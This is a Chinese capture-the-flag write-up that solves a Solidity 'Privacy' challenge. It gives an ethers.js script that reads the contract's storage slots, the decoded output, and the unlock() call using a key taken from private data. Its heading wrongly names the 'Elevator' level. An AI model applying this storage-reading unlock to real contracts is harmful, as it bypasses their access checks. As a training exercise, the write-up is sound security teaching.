# 11 - Elevator

## 题目
攻击以下合约
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Privacy {
    bool public locked = true;
    uint256 public ID = block.timestamp;
    uint8 private flattening = 10;
    uint8 private denomination = 255;
    uint16 private awkwardness = uint16(block.timestamp);
    bytes32[3] private data;

    constructor(bytes32[3] memory _data) {
        data = _data;
    }

    function unlock(bytes16 _key) public {
        require(_key == bytes16(data[2]));
        locked = false;
    }

    /*
    A bunch of super advanced solidity algorithms...

      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
    */
}
```

## 解题
本题考察直接从链上读取合约的 storage 的内容，攻击脚本使用 ethers.js 库，代码如下 
```typescript
import {ethers} from 'ethers';

async function readPrivacyStorage() {
      // 连接到以太坊网络（这里使用 Goerli 测试网作为例子）
      const provider = new ethers.providers.JsonRpcProvider('');

      // Privacy 合约的地址
      const contractAddress = '';

      // 读取所有相关的存储槽
      const storage = await Promise.all([
   provider.getStorageAt(contractAddress, 0),
   provider.getStorageAt(contractAddress, 1),
   provider.getStorageAt(contractAddress, 2),
   provider.getStorageAt(contractAddress, 3),
   provider.getStorageAt(contractAddress, 4),
   provider.getStorageAt(contractAddress, 5)
   ]);

      // 解析并打印存储值
      console.log("locked:", storage[0] === '0x0000000000000000000000000000000000000000000000000000000000000001');
      console.log("ID:", ethers.BigNumber.from(storage[1]).toString());

      // flattening, denomination, 和 awkwardness 打包在一起
      const packedData = ethers.BigNumber.from(storage[2]);
      console.log("flattening:", packedData.and(0xFF).toNumber());
      console.log("denomination:", packedData.shr(8).and(0xFF).toNumber());
      console.log("awkwardness:", packedData.shr(16).and(0xFFFF).toNumber());

      // data 数组
      console.log("data[0]:", storage[3]);
      console.log("data[1]:", storage[4]);
      console.log("data[2]:", storage[5]);

      // 提取解锁密钥（data[2] 的前 16 字节）
      const key = storage[5].slice(0, 34); // "0x" + 32 个字符
      console.log("Unlock key (first 16 bytes of data[2]):", key);
   }
/*
* locked: true
ID: 1726109064
flattening: 10
denomination: 255
awkwardness: 21896
data[0]: 0x465fae9e8ea90729dbb131ebf43b35fbc8f9aeaa22353bac387475cd01236ac7
data[1]: 0x1889af6f43bad6de75ff52b59cb1dfc520d8babd56b3278626fdb7e459b4e613
data[2]: 0x55daa2b1d25ee2555b8e686ebcd1b4f476631e1a5e70d11148f36fa5b029127b
Unlock key (first 16 bytes of data[2]): 0x55daa2b1d25ee2555b8e686ebcd1b4f4
*/

```
在 浏览器console 中输入await contract.unlock("0x55daa2b1d25ee2555b8e686ebcd1b4f4") ，即可破解